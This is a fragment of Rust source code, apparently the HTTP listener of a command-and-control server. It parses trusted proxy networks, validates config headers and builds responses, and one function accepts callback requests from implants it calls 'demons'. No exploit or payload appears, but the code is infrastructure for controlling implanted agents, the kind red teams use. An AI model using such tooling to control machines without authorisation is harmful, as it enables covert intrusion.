        hops.into_iter().map(|hop| hop.parse::<IpAddr>().ok()).collect::<Option<Vec<_>>>()?;

    for hop in hops.into_iter().rev() {
        if peer_is_trusted_proxy(hop, trusted_proxy_peers) {
            continue;
        }
        return Some(hop);
    }

    None
}

pub(crate) fn parse_trusted_proxy_peer(
    value: &str,
    listener_name: &str,
) -> Result<TrustedProxyPeer, ListenerManagerError> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: value must not be empty"
            ),
        });
    }

    if let Ok(address) = trimmed.parse::<IpAddr>() {
        return Ok(TrustedProxyPeer::Address(address));
    }

    let Some((network, prefix_len)) = trimmed.split_once('/') else {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` must be an IP address or CIDR"
            ),
        });
    };

    let network = network.parse::<IpAddr>().map_err(|_| ListenerManagerError::InvalidConfig {
        message: format!(
            "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` must be an IP address or CIDR"
        ),
    })?;
    let prefix_len =
        prefix_len.parse::<u8>().map_err(|_| ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` has an invalid prefix length"
            ),
        })?;
    let max_prefix_len = match network {
        IpAddr::V4(_) => 32,
        IpAddr::V6(_) => 128,
    };
    if prefix_len > max_prefix_len {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` has an invalid prefix length"
            ),
        });
    }

    Ok(TrustedProxyPeer::Network(TrustedProxyNetwork { network, prefix_len }))
}

fn peer_is_trusted_proxy(peer_ip: IpAddr, trusted_proxy_peers: &[TrustedProxyPeer]) -> bool {
    trusted_proxy_peers.iter().any(|entry| match entry {
        TrustedProxyPeer::Address(address) => *address == peer_ip,
        TrustedProxyPeer::Network(network) => network.contains(peer_ip),
    })
}

fn prefix_mask_u32(prefix_len: u8) -> u32 {
    if prefix_len == 0 { 0 } else { u32::MAX << (32 - u32::from(prefix_len)) }
}

fn prefix_mask_u128(prefix_len: u8) -> u128 {
    if prefix_len == 0 { 0 } else { u128::MAX << (128 - u32::from(prefix_len)) }
}

// ── Validation / response building ──────────────────────────────────────────

pub(crate) fn is_valid_demon_callback_request(body: &[u8]) -> bool {
    if body.len() < MINIMUM_DEMON_CALLBACK_BYTES {
        return false;
    }

    if body[4..8] != DEMON_MAGIC_VALUE.to_be_bytes() {
        return false;
    }

    DemonHeader::from_bytes(body).is_ok()
}

fn parse_method(config: &HttpListenerConfig) -> Result<Method, ListenerManagerError> {
    config.method.as_deref().unwrap_or(DEFAULT_HTTP_METHOD).parse::<Method>().map_err(|error| {
        ListenerManagerError::InvalidConfig {
            message: format!("invalid HTTP method for listener `{}`: {error}", config.name),
        }
    })
}

fn parse_expected_header(
    header: &str,
    listener_name: &str,
) -> Result<Option<ExpectedHeader>, ListenerManagerError> {
    let Some((name, value)) = split_header(header) else {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header `{header}`"
            ),
        });
    };

    if HEADER_VALIDATION_IGNORES.iter().any(|ignored| name.eq_ignore_ascii_case(ignored)) {
        return Ok(None);
    }

    let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
        ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header name `{name}`: {error}"
            ),
        }
    })?;

    Ok(Some(ExpectedHeader { name, expected_value: value.to_owned() }))
}

fn parse_response_headers(
    response: &HttpListenerResponseConfig,
    listener_name: &str,
) -> Result<Vec<(HeaderName, HeaderValue)>, ListenerManagerError> {
    response
        .headers
        .iter()
        .map(|header| {
            let Some((name, value)) = split_header(header) else {
                return Err(ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header `{header}`"
                    ),
                });
            };

            let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header name `{name}`: {error}"
                    ),
                }
            })?;
            let value = HeaderValue::from_str(value).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header value for `{name}`: {error}"
                    ),
                }
            })?;

            Ok((name, value))
        })
        .collect()
}

fn split_header(header: &str) -> Option<(&str, &str)> {
    let (name, value) = header.split_once(':')?;
    let name = name.trim();
    let value = value.trim();

    if name.is_empty() {
        return None;
    }

    Some((name, value))
}

pub(crate) fn build_response(
    status: StatusCode,
    body: &[u8],
    headers: &[(HeaderName, HeaderValue)],
) -> Response {
    let mut response = Response::new(axum::body::Body::from(body.to_vec()));
    *response.status_mut() = status;

    let response_headers = response.headers_mut();
    for (name, value) in headers {
        response_headers.insert(name.clone(), value.clone());
    }

    response
}

pub(crate) fn set_default_header(headers: &mut HeaderMap, name: &'static str, value: &'static str) {
    let header_name = HeaderName::from_static(name);
    if !headers.contains_key(&header_name) {
        headers.insert(header_name, HeaderValue::from_static(value));
    }
}
